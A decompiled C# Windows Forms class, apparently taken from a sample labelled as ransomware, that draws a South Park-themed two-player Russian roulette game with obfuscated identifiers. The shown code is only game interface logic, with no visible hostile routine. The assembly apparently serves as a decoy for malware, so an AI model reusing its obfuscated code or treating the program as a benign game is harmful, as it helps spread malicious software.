// Decompiled with JetBrains decompiler
// Type: 司j城MQ公族氏商是f.m官sCq的hFD生w的望
// Assembly: p家s顾 公cI, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B63AEC7C-72D0-426E-ABEA-6AC0CAFDAC3B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Purgen.gen-07ea6a87a1ac2a5363e7756a8994f7ed8b971b94cef918803ab3b6dbe9e6b845.exe

using byZ太氏TDkvM的家望;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using uk希nTN席顾官Byf;

namespace 司j城MQ公族氏商是f
{
  [DesignerGenerated]
  public class m官sCq的hFD生w的望 : Form
  {
    private IContainer EG执泽执P官J太的z的;
    public DAVCoi城KSo s顾H的iKSQ望;
    private bool GtB行rZ孙的的;

    public m官sCq的hFD生w的望()
    {
      this.Load += new EventHandler(this.MultiPlayer_Load);
      this.s顾H的iKSQ望 = new DAVCoi城KSo();
      this.GtB行rZ孙的的 = true;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool 是bB席官司RZh顾的官)
    {
      try
      {
        if (!是bB席官司RZh顾的官 || this.EG执泽执P官J太的z的 == null)
          return;
        this.EG执泽执P官J太的z的.Dispose();
      }
      finally
      {
        base.Dispose(是bB席官司RZh顾的官);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.EG执泽执P官J太的z的 = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (m官sCq的hFD生w的望));
      this.btnMusic = new Button();
      this.cbSongSelection = new ComboBox();
      this.btnQuit = new Button();
      this.pbCylinder = new PictureBox();
      this.btnSpin = new Button();
      this.PictureBox1 = new PictureBox();
      this.pbIndicator1 = new PictureBox();
      this.pbJoker = new PictureBox();
      this.pbSecondPlayer = new PictureBox();
      this.tMovement = new Timer(this.EG执泽执P官J太的z的);
      this.tAnimation = new Timer(this.EG执泽执P官J太的z的);
      this.JokerFaceTransition = new Timer(this.EG执泽执P官J太的z的);
      this.btnPlayer1 = new Button();
      this.btnPlayer2 = new Button();
      this.btnRandom = new Button();
      this.lblWhosTurn = new Label();
      this.pbCheat = new PictureBox();
      this.lblAnswer = new Label();
      this.lblSubHeader = new Label();
      this.Label1 = new Label();
      ((ISupportInitialize) this.pbCylinder).BeginInit();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      ((ISupportInitialize) this.pbIndicator1).BeginInit();
      ((ISupportInitialize) this.pbJoker).BeginInit();
      ((ISupportInitialize) this.pbSecondPlayer).BeginInit();
      ((ISupportInitialize) this.pbCheat).BeginInit();
      this.SuspendLayout();
      this.btnMusic.Location = new Point(165, 471);
      this.btnMusic.Name = "btnMusic";
      this.btnMusic.Size = new Size(75, 23);
      this.btnMusic.TabIndex = 29;
      this.btnMusic.Text = "Play / Stop";
      this.btnMusic.UseVisualStyleBackColor = true;
      this.cbSongSelection.FormattingEnabled = true;
      this.cbSongSelection.Items.AddRange(new object[2]
      {
        (object) "SouthPark Intro",
        (object) "What_Would_Brian_Boitano_Do"
      });
      this.cbSongSelection.Location = new Point(7, 471);
      this.cbSongSelection.Name = "cbSongSelection";
      this.cbSongSelection.Size = new Size(142, 21);
      this.cbSongSelection.TabIndex = 28;
      this.btnQuit.BackColor = SystemColors.ControlDarkDark;
      this.btnQuit.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnQuit.ForeColor = SystemColors.ButtonFace;
      this.btnQuit.Location = new Point(454, 467);
      this.btnQuit.Name = "btnQuit";
      this.btnQuit.Size = new Size(133, 31);
      this.btnQuit.TabIndex = 27;
      this.btnQuit.Text = "Quit";
      this.btnQuit.UseVisualStyleBackColor = false;
      this.pbCylinder.BackColor = Color.Transparent;
      this.pbCylinder.Image = (Image) componentResourceManager.GetObject("pbCylinder.Image");
      this.pbCylinder.Location = new Point(728, 5);
      this.pbCylinder.Name = "pbCylinder";
      this.pbCylinder.Size = new Size(129, 111);
      this.pbCylinder.SizeMode = PictureBoxSizeMode.Zoom;
      this.pbCylinder.TabIndex = 26;
      this.pbCylinder.TabStop = false;
      this.btnSpin.BackColor = SystemColors.ControlDarkDark;
      this.btnSpin.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnSpin.ForeColor = SystemColors.ButtonFace;
      this.btnSpin.Location = new Point(302, 467);
      this.btnSpin.Name = "btnSpin";
      this.btnSpin.Size = new Size(133, 31);
      this.btnSpin.TabIndex = 25;
      this.btnSpin.Text = "Spin Chamber";
      this.btnSpin.UseVisualStyleBackColor = false;
      this.PictureBox1.BackColor = Color.Transparent;
      this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
      this.PictureBox1.Location = new Point(647, 150);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(70, 87);
      this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.PictureBox1.TabIndex = 22;
      this.PictureBox1.TabStop = false;
      this.PictureBox1.Visible = false;
      this.pbIndicator1.BackColor = Color.Transparent;
      this.pbIndicator1.Image = (Image) componentResourceManager.GetObject("pbIndicator1.Image");
      this.pbIndicator1.Location = new Point(217, 150);
      this.pbIndicator1.Name = "pbIndicator1";
      this.pbIndicator1.Size = new Size(70, 87);
      this.pbIndicator1.SizeMode = PictureBoxSizeMode.Zoom;
      this.pbIndicator1.TabIndex = 21;
      this.pbIndicator1.TabStop = false;
      this.pbIndicator1.Visible = false;
      this.pbJoker.BackColor = Color.Transparent;
      this.pbJoker.Image = (Image) componentResourceManager.GetObject("pbJoker.Image");
      this.pbJoker.Location = new Point(186, 242);
      this.pbJoker.Name = "pbJoker";
      this.pbJoker.Size = new Size(144, 187);
      this.pbJoker.SizeMode = PictureBoxSizeMode.Zoom;
      this.pbJoker.TabIndex = 16;
      this.pbJoker.TabStop = false;
      this.pbSecondPlayer.BackColor = Color.Transparent;
      this.pbSecondPlayer.Location = new Point(611, 242);
      this.pbSecondPlayer.Name = "pbSecondPlayer";
      this.pbSecondPlayer.Size = new Size(144, 187);
      this.pbSecondPlayer.SizeMode = PictureBoxSizeMode.Zoom;
      this.pbSecondPlayer.TabIndex = 30;
      this.pbSecondPlayer.TabStop = false;
      this.btnPlayer1.BackColor = Color.Orange;
      this.btnPlayer1.BackgroundImageLayout = ImageLayout.None;
      this.btnPlayer1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnPlayer1.ForeColor = SystemColors.ControlLight;
      this.btnPlayer1.Location = new Point(7, 23);
      this.btnPlayer1.Name = "btnPlayer1";
      this.btnPlayer1.Size = new Size(290, 406);
      this.btnPlayer1.TabIndex = 31;
      this.btnPlayer1.Text = "Player 1 Starts";
      this.btnPlayer1.TextAlign = ContentAlignment.BottomCenter;
      this.btnPlayer1.UseVisualStyleBackColor = false;
      this.btnPlayer2.BackColor = Color.Orange;
      this.btnPlayer2.BackgroundImageLayout = ImageLayout.Zoom;
      this.btnPlayer2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnPlayer2.ForeColor = SystemColors.ControlLight;
      this.btnPlayer2.Location = new Point(578, 23);
      this.btnPlayer2.Name = "btnPlayer2";
      this.btnPlayer2.Size = new Size(279, 406);
      this.btnPlayer2.TabIndex = 32;
      this.btnPlayer2.Text = "Player 2 Starts";
      this.btnPlayer2.TextAlign = ContentAlignment.BottomCenter;
      this.btnPlayer2.UseVisualStyleBackColor = false;
      this.btnRandom.BackColor = Color.Orange;
      this.btnRandom.BackgroundImageLayout = ImageLayout.Zoom;
      this.btnRandom.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnRandom.ForeColor = SystemColors.ControlLight;
      this.btnRandom.Location = new Point(293, 23);
      this.btnRandom.Name = "btnRandom";
      this.btnRandom.Size = new Size(291, 406);
      this.btnRandom.TabIndex = 33;
      this.btnRandom.Text = "Random";
      this.btnRandom.TextAlign = ContentAlignment.BottomCenter;
      this.btnRandom.UseVisualStyleBackColor = false;
      this.lblWhosTurn.AutoSize = true;
      this.lblWhosTurn.BackColor = Color.Transparent;
      this.lblWhosTurn.ForeColor = SystemColors.ControlLight;
      this.lblWhosTurn.Location = new Point(608, 476);
      this.lblWhosTurn.Name = "lblWhosTurn";
      this.lblWhosTurn.Size = new Size(93, 13);
      this.lblWhosTurn.TabIndex = 34;
      this.lblWhosTurn.Text = "Select Who Starts";
      this.pbCheat.BackColor = Color.Transparent;
      this.pbCheat.Location = new Point(59, 225);
      this.pbCheat.Name = "pbCheat";
      this.pbCheat.Size = new Size(100, 101);
      this.pbCheat.TabIndex = 35;
      this.pbCheat.TabStop = false;
      this.lblAnswer.AutoSize = true;
      this.lblAnswer.BackColor = Color.Transparent;
      this.lblAnswer.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lblAnswer.ForeColor = SystemColors.ControlLightLight;
      this.lblAnswer.Location = new Point(800, 469);
      this.lblAnswer.Name = "lblAnswer";
      this.lblAnswer.Size = new Size(62, 20);
      this.lblAnswer.TabIndex = 36;
      this.lblAnswer.Text = "Answer";
      this.lblAnswer.Visible = false;
      this.lblSubHeader.AutoSize = true;
      this.lblSubHeader.BackColor = Color.Transparent;
      this.lblSubHeader.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lblSubHeader.Location = new Point(21, 77);
      this.lblSubHeader.Name = "lblSubHeader";
      this.lblSubHeader.Size = new Size(696, 17);
      this.lblSubHeader.TabIndex = 37;
      this.lblSubHeader.Text = "Be careful not to miss when shooting the opponent or else you have to wait until they miss to regain your shot";
      this.Label1.AutoSize = true;
      this.Label1.BackColor = Color.Transparent;
      this.Label1.Font = new Font("Comic Sans MS", 39f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.Location = new Point(12, 5);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(715, 72);
      this.Label1.TabIndex = 38;
      this.Label1.Text = "Click a Character to Shoot";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(869, 501);
      this.Controls.Add((Control) this.btnPlayer2);
      this.Controls.Add((Control) this.btnRandom);
      this.Controls.Add((Control) this.btnPlayer1);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.lblSubHeader);
      this.Controls.Add((Control) this.lblAnswer);
      this.Controls.Add((Control) this.pbCheat);
      this.Controls.Add((Control) this.lblWhosTurn);
      this.Controls.Add((Control) this.pbSecondPlayer);
      this.Controls.Add((Control) this.btnMusic);
      this.Controls.Add((Control) this.cbSongSelection);
      this.Controls.Add((Control) this.btnQuit);
      this.Controls.Add((Control) this.pbCylinder);
      this.Controls.Add((Control) this.btnSpin);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.pbIndicator1);
      this.Controls.Add((Control) this.pbJoker);
      this.Name = "MultiPlayer";
      this.Text = "MultiPlayer";
      ((ISupportInitialize) this.pbCylinder).EndInit();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      ((ISupportInitialize) this.pbIndicator1).EndInit();
      ((ISupportInitialize) this.pbJoker).EndInit();
      ((ISupportInitialize) this.pbSecondPlayer).EndInit();
      ((ISupportInitialize) this.pbCheat).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button btnMusic
    {
      get => this.lnC物w首hmCFetn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnMusic_Click);
        Button lnC物w首hmCfetn1 = this.lnC物w首hmCFetn;
        if (lnC物w首hmCfetn1 != null)
          lnC物w首hmCfetn1.Click -= eventHandler;
        this.lnC物w首hmCFetn = value;
        Button lnC物w首hmCfetn2 = this.lnC物w首hmCFetn;
        if (lnC物w首hmCfetn2 == null)
          return;
        lnC物w首hmCfetn2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("cbSongSelection")]
    internal virtual ComboBox cbSongSelection { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnQuit
    {
      get => this.家q执aAwoDm执vR顾;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnQuit_Click);
        Button 家q执aAwoDm执vR顾1 = this.家q执aAwoDm执vR顾;
        if (家q执aAwoDm执vR顾1 != null)
          家q执aAwoDm执vR顾1.Click -= eventHandler;
        this.家q执aAwoDm执vR顾 = value;
        Button 家q执aAwoDm执vR顾2 = this.家q执aAwoDm执vR顾;
        if (家q执aAwoDm执vR顾2 == null)
          return;
        家q执aAwoDm执vR顾2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("pbCylinder")]
    internal virtual PictureBox pbCylinder { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnSpin
    {
      get => this.首lt是顾R她成y泽;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnSpin_Click);
        Button 首lt是顾R她成y泽1 = this.首lt是顾R她成y泽;
        if (首lt是顾R她成y泽1 != null)
          首lt是顾R她成y泽1.Click -= eventHandler;
        this.首lt是顾R她成y泽 = value;
        Button 首lt是顾R她成y泽2 = this.首lt是顾R她成y泽;
        if (首lt是顾R她成y泽2 == null)
          return;
        首lt是顾R她成y泽2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PictureBox1")]
    internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("pbIndicator1")]
    internal virtual PictureBox pbIndicator1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox pbJoker
    {
      get => this.希o物Gav司F生;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.pbJoker_Click);
        EventHandler eventHandler2 = new EventHandler(this.pbJoker_MouseHover);
        EventHandler eventHandler3 = new EventHandler(this.pbJoker_MouseLeave);
        PictureBox 希o物Gav司F生1 = this.希o物Gav司F生;
        if (希o物Gav司F生1 != null)
        {
          希o物Gav司F生1.Click -= eventHandler1;
          希o物Gav司F生1.MouseHover -= eventHandler2;
          希o物Gav司F生1.MouseLeave -= eventHandler3;
        }
        this.希o物Gav司F生 = value;
        PictureBox 希o物Gav司F生2 = this.希o物Gav司F生;
        if (希o物Gav司F生2 == null)
          return;
        希o物Gav司F生2.Click += eventHandler1;
        希o物Gav司F生2.MouseHover += eventHandler2;
        希o物Gav司F生2.MouseLeave += eventHandler3;
      }
    }

    internal virtual PictureBox pbSecondPlayer
    {
      get => this.I城的cBNBRBK顾;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler1 = new EventHandler(this.pbSecondPlayer_Click);
        EventHandler eventHandler2 = new EventHandler(this.pbSecondPlayer_MouseHover);
        EventHandler eventHandler3 = new EventHandler(this.pbSecondPlayer_MouseLeave);
        PictureBox i城的cBnbrbK顾1 = this.I城的cBNBRBK顾;
        if (i城的cBnbrbK顾1 != null)
        {
          i城的cBnbrbK顾1.Click -= eventHandler1;
          i城的cBnbrbK顾1.MouseHover -= eventHandler2;
          i城的cBnbrbK顾1.MouseLeave -= eventHandler3;
        }
        this.I城的cBNBRBK顾 = value;
        PictureBox i城的cBnbrbK顾2 = this.I城的cBNBRBK顾;
        if (i城的cBnbrbK顾2 == null)
          return;
        i城的cBnbrbK顾2.Click += eventHandler1;
        i城的cBnbrbK顾2.MouseHover += eventHandler2;
        i城的cBnbrbK顾2.MouseLeave += eventHandler3;
      }
    }

    internal virtual Timer tMovement
    {
      get => this.CX行FP希KOrs顾是;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.tMovement_Tick);
        Timer cx行Fp希Kors顾是1 = this.CX行FP希KOrs顾是;
        if (cx行Fp希Kors顾是1 != null)
          cx行Fp希Kors顾是1.Tick -= eventHandler;
        this.CX行FP希KOrs顾是 = value;
        Timer cx行Fp希Kors顾是2 = this.CX行FP希KOrs顾是;
        if (cx行Fp希Kors顾是2 == null)
          return;
        cx行Fp希Kors顾是2.Tick += eventHandler;
      }
    }

    internal virtual Timer tAnimation
    {
      get => this.太官U首rO望k顾城;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.tAnimation_Tick);
        Timer 太官U首rO望k顾城1 = this.太官U首rO望k顾城;
        if (太官U首rO望k顾城1 != null)
          太官U首rO望k顾城1.Tick -= eventHandler;
        this.太官U首rO望k顾城 = value;
        Timer 太官U首rO望k顾城2 = this.太官U首rO望k顾城;
        if (太官U首rO望k顾城2 == null)
          return;
        太官U首rO望k顾城2.Tick += eventHandler;
      }
    }

    internal virtual Timer JokerFaceTransition
    {
      get => this.lk物成Rw太erK;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.JokerFaceTransition_Tick);
        Timer lk物成Rw太erK1 = this.lk物成Rw太erK;
        if (lk物成Rw太erK1 != null)
          lk物成Rw太erK1.Tick -= eventHandler;
        this.lk物成Rw太erK = value;
        Timer lk物成Rw太erK2 = this.lk物成Rw太erK;
        if (lk物成Rw太erK2 == null)
          return;
        lk物成Rw太erK2.Tick += eventHandler;
      }
    }

    internal virtual Button btnPlayer1
    {
      get => this.a行太CpvjbQ氏x;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnPlayer1_Click);
        Button a行太CpvjbQ氏x1 = this.a行太CpvjbQ氏x;
        if (a行太CpvjbQ氏x1 != null)
          a行太CpvjbQ氏x1.Click -= eventHandler;
        this.a行太CpvjbQ氏x = value;
        Button a行太CpvjbQ氏x2 = this.a行太CpvjbQ氏x;
        if (a行太CpvjbQ氏x2 == null)
          return;
        a行太CpvjbQ氏x2.Click += eventHandler;
      }
    }

    internal virtual Button btnPlayer2
    {
      get => this.商她gDKwlx望N;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnPlayer2_Click);
        Button 商她gDkwlx望N1 = this.商她gDKwlx望N;
        if (商她gDkwlx望N1 != null)
          商她gDkwlx望N1.Click -= eventHandler;
        this.商她gDKwlx望N = value;
        Button 商她gDkwlx望N2 = this.商她gDKwlx望N;
        if (商她gDkwlx望N2 == null)
          return;
        商她gDkwlx望N2.Click += eventHandler;
      }
    }

    internal virtual Button btnRandom
    {
      get => this.TevExvWB执qjOD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.btnRandom_Click);
        Button tevExvWb执qjOd1 = this.TevExvWB执qjOD;
        if (tevExvWb执qjOd1 != null)
          tevExvWb执qjOd1.Click -= eventHandler;
        this.TevExvWB执qjOD = value;
        Button tevExvWb执qjOd2 = this.TevExvWB执qjOD;
        if (tevExvWb执qjOd2 == null)
          return;
        tevExvWb执qjOd2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("lblWhosTurn")]
    internal virtual Label lblWhosTurn { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox pbCheat
    {
      get => this.i成M首司官YXuOmg;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.pbCheat_Click);
        PictureBox i成M首司官YxuOmg1 = this.i成M首司官YXuOmg;
        if (i成M首司官YxuOmg1 != null)
          i成M首司官YxuOmg1.Click -= eventHandler;
        this.i成M首司官YXuOmg = value;
        PictureBox i成M首司官YxuOmg2 = this.i成M首司官YXuOmg;
        if (i成M首司官YxuOmg2 == null)
          return;
        i成M首司官YxuOmg2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("lblAnswer")]
    internal virtual Label lblAnswer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblSubHeader")]
    internal virtual Label lblSubHeader { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    private void btnMusic_Click(object h太R太tvBQN是sK, EventArgs wXv生官qI生uQPbz)
    {
      if (this.GtB行rZ孙的的)
      {
        if (Operators.CompareString(this.cbSongSelection.Text, "SouthPark Intro", false) != 0)
          ;
      }
      else
      {
        Eg商生mv执执FoTRZ.Computer.Audio.Stop();
        this.GtB行rZ孙的的 = true;
      }
    }

    private void btnQuit_Click(object 的太U氏dG城的n, EventArgs p顾席a顾Zwlq席她) => Eg商生mv执执FoTRZ.Forms.QuitForm.Show();

    private void pbJoker_Click(object 她泽cGz她ma氏R, EventArgs q生她t泽首的dWkLH行)
    {
      if (this.s顾H的iKSQ望.eQsoSkg执Cl)
      {
        this.s顾H的iKSQ望.ShootMyselfPlayer1();
      }
      else
      {
        this.tMovement.Start();
        this.tAnimation.Start();
      }
    }

    private void pbSecondPlayer_Click(object i官太TeljhgxO她, EventArgs HmJ司F她泽的Aj)
    {
      if (!this.s顾H的iKSQ望.eQsoSkg执Cl)
      {
        this.s顾H的iKSQ望.ShootMyselfPlayer2();
      }
      else
      {
        this.tMovement.Start();
        this.tAnimation.Start();
      }
    }

    private void tMovement_Tick(object pWlJYKjVKg执成, EventArgs 是望g城顾R物BhsU)
    {
      if (this.s顾H的iKSQ望.eQsoSkg执Cl)
      {
        this.s顾H的iKSQ望.执k孙taq顾是P = this.pbJoker;
        if (!this.s顾H的iKSQ望.g顾的NXhwCtc)
          this.s顾H的iKSQ望.MovementForwardPlayer1();
        if (!this.s顾H的iKSQ望.g顾的NXhwCtc)
          return;
        this.s顾H的iKSQ望.MovementBackwardsPlayer1();
      }
      else
      {
        this.s顾H的iKSQ望.执k孙taq顾是P = this.pbSecondPlayer;
        if (!this.s顾H的iKSQ望.g顾的NXhwCtc)
          this.s顾H的iKSQ望.MovementForwardPlayer2();
        if (this.s顾H的iKSQ望.g顾的NXhwCtc)
          this.s顾H的iKSQ望.MovementBackwardsPlayer2();
      }
    }

    private void JokerFaceTransition_Tick(object 的X泽公公BFGLd是z生, EventArgs 太的slN顾gr成)
    {
      if (this.s顾H的iKSQ望.eQsoSkg执Cl)
        this.s顾H的iKSQ望.BulletMiss_MySelfPlayer1();
      else
        this.s顾H的iKSQ望.BulletMiss_MySelfPlayer2();
    }

    private void tAnimation_Tick(object Pw执jHB是e行, EventArgs LmdJ物CiW泽A执)
    {
      if (this.s顾H的iKSQ望.eQsoSkg执Cl)
      {
        this.s顾H的iKSQ望.执k孙taq顾是P = this.pbJoker;
        this.s顾H的iKSQ望.Animation();
      }
      else
      {
        this.s顾H的iKSQ望.执k孙taq顾是P = this.pbSecondPlayer;
        this.s顾H的iKSQ望.Animation2();
      }
    }

    private void pbJoker_MouseHover(object jz她首IwBB城太Sv, EventArgs 席的Wy商V孙hfUF) => this.pbIndicator1.Visible = true;

    private void pbJoker_MouseLeave(object GK公H城lbui司执, EventArgs 希t公AnI顾太hq公) => this.pbIndicator1.Visible = false;

    private void pbSecondPlayer_MouseHover(object 司Ywfny族Cpd, EventArgs I顾tzGr氏k家) => this.PictureBox1.Visible = true;

    private void pbSecondPlayer_MouseLeave(object 公b席Jzu望B首aP物u, EventArgs Jow泽k商lUPr) => this.PictureBox1.Visible = false;

    private void btnPlayer1_Click(object 商uIj孙f成商太顾wg, EventArgs o的g顾a族J城的U)
    {
      this.s顾H的iKSQ望.eQsoSkg执Cl = true;
      this.btnPlayer1.Visible = false;
      this.btnPlayer2.Visible = false;
      this.btnRandom.Visible = false;
      if (!this.s顾H的iKSQ望.eQsoSkg执Cl)
        return;
      this.lblWhosTurn.Text = "Player 1's Turn";
    }

    private void btnPlayer2_Click(object Svu顾t公N公她kp, EventArgs mSmuK官a望M)
    {
      this.s顾H的iKSQ望.eQsoSkg执Cl = false;
      this.btnPlayer1.Visible = false;
      this.btnPlayer2.Visible = false;
      this.btnRandom.Visible = false;
      if (this.s顾H的iKSQ望.eQsoSkg执Cl)
        return;
      this.lblWhosTurn.Text = "Player 2's Turn";
    }

    private void btnRandom_Click(object a行f孙ltMFP, EventArgs 的u执El成席顾JlIIz)
    {
      this.s顾H的iKSQ望.eQsoSkg执Cl = this.s顾H的iKSQ望.的A首zxI太Qlkz席 == 1;
      this.btnPlayer1.Visible = false;
      this.btnPlayer2.Visible = false;
      this.btnRandom.Visible = false;
      this.lblWhosTurn.Text = "Player" + Conversions.ToString(this.s顾H的iKSQ望.的A首zxI太Qlkz席) + "'s Turn";
    }

    private void pbCheat_Click(object uEo商zrW的氏, EventArgs 太d太Q生TWq太的a)
    {
      this.lblAnswer.Visible = true;
      this.lblAnswer.Text = Conversions.ToString(this.s顾H的iKSQ望.m太Q的z顾FO行官);
    }

    private void MultiPlayer_Load(object CF商E家RlbW官官aF, EventArgs 成CGX首ztc司是)
    {
      this.cbSongSelection.Text = "SouthPark Intro";
      this.GtB行rZ孙的的 = false;
    }

    private void btnSpin_Click(object Whp首S执uA家家G顾R, EventArgs 的L生o氏KR城uO顾GT)
    {
      this.s顾H的iKSQ望.BulletRandomLocation();
      this.s顾H的iKSQ望.她官Wmdl席vrT = 1;
      this.lblAnswer.Text = Conversions.ToString(this.s顾H的iKSQ望.m太Q的z顾FO行官);
      this.pbCylinder.Refresh();
    }
  }
}
